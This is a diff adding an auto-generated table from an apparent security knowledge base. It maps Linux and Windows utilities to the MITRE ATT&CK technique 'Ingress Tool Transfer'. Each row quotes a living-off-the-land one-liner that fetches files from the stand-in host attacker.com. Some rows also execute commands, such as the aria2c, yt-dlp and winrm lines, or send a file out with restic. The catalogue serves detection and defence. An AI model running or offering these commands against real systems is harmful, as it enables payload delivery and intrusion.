@@ -1,0 +1,26 @@
+---
+parsed_by: focuslocust
+source: build
+type: generated
+---
+# Inferred Relationships
+
+| Item | Relationship | Confidence | Evidence |
+| --- | --- | --- | --- |
+| [ab](../kb/tools/linux/ab.md) → [T1105 - Ingress Tool Transfer](../kb/attack/techniques/T1105-ingress-tool-transfer.md) | inferred | high | Command appears to retrieve a remote file: ab -v2 http://attacker.com/path/to/input-file |
+| [aria2c](../kb/tools/linux/aria2c.md) → [T1105 - Ingress Tool Transfer](../kb/attack/techniques/T1105-ingress-tool-transfer.md) | inferred | high | Command appears to retrieve a remote file: echo /path/to/command >/path/to/temp-file chmod +x /path/to/temp-file aria2c --on-download-error=/path/to/temp-file http://some-invalid-domain |
+| [curl](../kb/tools/linux/curl.md) → [T1105 - Ingress Tool Transfer](../kb/attack/techniques/T1105-ingress-tool-transfer.md) | inferred | high | Command appears to retrieve a remote file: curl http://attacker.com/path/to/input-file -o /path/to/output-file |
+| [jjs](../kb/tools/linux/jjs.md) → [T1105 - Ingress Tool Transfer](../kb/attack/techniques/T1105-ingress-tool-transfer.md) | inferred | high | Command appears to retrieve a remote file: jjs var URL = Java.type('java.net.URL'); var ws = new URL('http://attacker.com/path/to/input-file'); var Channels = Java.type('java.nio.channels.Channels'); var rbc = Channels.n... |
+| [jrunscript](../kb/tools/linux/jrunscript.md) → [T1105 - Ingress Tool Transfer](../kb/attack/techniques/T1105-ingress-tool-transfer.md) | inferred | high | Command appears to retrieve a remote file: jrunscript -e 'cp("http://attacker.com/path/to/input-file","/path/to/output-file")' |
+| [julia](../kb/tools/linux/julia.md) → [T1105 - Ingress Tool Transfer](../kb/attack/techniques/T1105-ingress-tool-transfer.md) | inferred | high | Command appears to retrieve a remote file: julia -e 'download("http://attacker.com/path/to/input-file", "/path/to/output-file")' |
+| [kubectl](../kb/tools/linux/kubectl.md) → [T1105 - Ingress Tool Transfer](../kb/attack/techniques/T1105-ingress-tool-transfer.md) | inferred | high | Command appears to retrieve a remote file: cat >/path/to/temp-file <<EOF clusters: - cluster: server: https://x name: x contexts: - context: cluster: x user: x name: x current-context: x users: - name: x user: exec: apiV... |
+| [lwp-download](../kb/tools/linux/lwp-download.md) → [T1105 - Ingress Tool Transfer](../kb/attack/techniques/T1105-ingress-tool-transfer.md) | inferred | high | Command appears to retrieve a remote file: lwp-download http://attacker.com/path/to/input-file /path/to/output-file |
+| [node](../kb/tools/linux/node.md) → [T1105 - Ingress Tool Transfer](../kb/attack/techniques/T1105-ingress-tool-transfer.md) | inferred | high | Command appears to retrieve a remote file: node -e 'require("http").get("http://attacker.com/path/to/input-file", res => res.pipe(require("fs").createWriteStream("/path/to/output-file")))' |
+| [php](../kb/tools/linux/php.md) → [T1105 - Ingress Tool Transfer](../kb/attack/techniques/T1105-ingress-tool-transfer.md) | inferred | high | Command appears to retrieve a remote file: php -r '$c=file_get_contents("http://attacker.com/path/to/input-file"); file_put_contents("/path/to/output-file", $c);' |
+| [python](../kb/tools/linux/python.md) → [T1105 - Ingress Tool Transfer](../kb/attack/techniques/T1105-ingress-tool-transfer.md) | inferred | high | Command appears to retrieve a remote file: python -c 'import sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r else: import urllib as r r.urlretrieve("http://attacker.com/path/to... |
+| [restic](../kb/tools/linux/restic.md) → [T1105 - Ingress Tool Transfer](../kb/attack/techniques/T1105-ingress-tool-transfer.md) | inferred | high | Command appears to retrieve a remote file: restic backup -r rest:http://attacker.com:12345/x /path/to/input-file |
+| [ruby](../kb/tools/linux/ruby.md) → [T1105 - Ingress Tool Transfer](../kb/attack/techniques/T1105-ingress-tool-transfer.md) | inferred | high | Command appears to retrieve a remote file: ruby -e 'require "open-uri"; download = URI.open("http://attacker.com/path/to/input-file"); IO.copy_stream(download, "/path/to/output-file")' |
+| [wget](../kb/tools/linux/wget.md) → [T1105 - Ingress Tool Transfer](../kb/attack/techniques/T1105-ingress-tool-transfer.md) | inferred | high | Command appears to retrieve a remote file: wget http://attacker.com/path/to/input-file -O /path/to/output-file |
+| [winrm.vbs](../kb/tools/windows/winrm.vbs.md) → [T1105 - Ingress Tool Transfer](../kb/attack/techniques/T1105-ingress-tool-transfer.md) | inferred | high | Command appears to retrieve a remote file: winrm invoke Create wmicimv2/Win32_Process @{CommandLine="{CMD}"} -r:http://target:5985 |
+| [yt-dlp](../kb/tools/linux/yt-dlp.md) → [T1105 - Ingress Tool Transfer](../kb/attack/techniques/T1105-ingress-tool-transfer.md) | inferred | high | Command appears to retrieve a remote file: yt-dlp 'https://www.youtube.com/watch?v=xxxxxxxxxxx' --exec '/bin/sh #' |
+| [yum](../kb/tools/linux/yum.md) → [T1105 - Ingress Tool Transfer](../kb/attack/techniques/T1105-ingress-tool-transfer.md) | inferred | high | Command appears to retrieve a remote file: yum install http://attacker.com/path/to/input-file.rpm |
